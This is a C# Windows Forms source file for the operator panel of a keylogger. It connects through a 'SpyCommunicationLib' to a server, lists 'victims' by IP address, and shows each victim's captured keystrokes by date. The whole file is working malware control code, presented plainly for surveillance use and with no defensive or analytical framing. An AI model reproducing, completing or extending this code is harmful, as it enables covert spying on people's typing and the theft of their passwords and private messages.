using SpyCommunicationLib;
using SpyCommunicationLib.Entities;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;

namespace ClientInterface
{
    public partial class WorkForm : Form
    {
        private readonly LoginForm _loginForm;
        private readonly ClientService _clientService;
        private List<string> allVictims = new List<string>();

        public WorkForm(LoginForm loginForm, ClientService clientService)
        {
            InitializeComponent();
            _loginForm = loginForm;
            _clientService = clientService;

            InitializeMenu();

            listBox1.SelectedIndexChanged += ListBox1_SelectedIndexChanged;
            button1.Click += button1_Click;
            button2.Click += button2_Click;
            button3.Click += button3_Click;

            button3.Visible = true;

            LoadVictimsFromServer();
        }

        private void InitializeMenu()
        {
            MenuStrip menuStrip = new MenuStrip();
            ToolStripMenuItem fileMenu = new ToolStripMenuItem("File");
            ToolStripMenuItem logoutMenuItem = new ToolStripMenuItem("Logout");
            logoutMenuItem.Click += LogoutMenuItem_Click;

            fileMenu.DropDownItems.Add(logoutMenuItem);
            menuStrip.Items.Add(fileMenu);

            this.Controls.Add(menuStrip);
            this.MainMenuStrip = menuStrip;
        }


        private void LogoutMenuItem_Click(object sender, EventArgs e)
        {
            this.Close();
            _loginForm.Show();
        }

        private async void LoadVictimsFromServer()
        {
            listBox1.Items.Clear();
            listBox2.Items.Clear();

            var victims = await _clientService.GetVictimIpListAsync();
            if (victims == null)
            {
                MessageBox.Show("Not managed to load victims.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            allVictims = victims.ToList();

            foreach (var ip in allVictims)
                listBox1.Items.Add(ip);
        }

        private async void ListBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            await LoadVictimRecordsAsync();
        }

        private async void button3_Click(object sender, EventArgs e)
        {
            await LoadVictimRecordsAsync();
        }

        private async Task LoadVictimRecordsAsync()
        {
            listBox2.Items.Clear();

            if (listBox1.SelectedItem == null)
                return;

            string selectedIp = listBox1.SelectedItem.ToString();

            var records = await _clientService.GetVictimRecordsAsync(selectedIp);
            if (records == null)
            {
                MessageBox.Show($"Not managed to load records for {selectedIp}.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            foreach (var record in records)
            {

                int[] key = record.Kyes;
                string output_keys = string.Join(", ", key.Select(k => (ConsoleKey)k));
                listBox2.Items.Add($"{record.Date:yyyy-MM-dd} - {output_keys}");
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string searchIp = textBox1.Text.Trim();
            listBox1.Items.Clear();
            listBox2.Items.Clear();

            if (string.IsNullOrEmpty(searchIp))
                return;

            var filtered = allVictims.Where(ip => ip.Contains(searchIp));
            foreach (var ip in filtered)
                listBox1.Items.Add(ip);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            LoadVictimsFromServer();
        }

        
    }
}